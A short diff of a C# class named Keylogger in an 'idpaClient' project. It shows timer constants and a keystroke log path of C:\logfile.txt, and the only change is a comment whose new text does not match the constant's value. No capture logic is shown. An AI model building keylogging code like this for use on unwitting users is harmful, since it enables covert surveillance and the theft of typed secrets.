@@ -16,7 +16,7 @@ namespace idpaClient
     public partial class Keylogger : Form
     {
         public const int KEY_LOG_TIMER = 10;
-        public const int LOG_WRITE_TIMER = 1000; //30 sek
+        public const int LOG_WRITE_TIMER = 1000; //60 sek = 60000
         private const string LOG_PATH = @"C:\logfile.txt";
 
         //private StringBuilder keyBuffer;
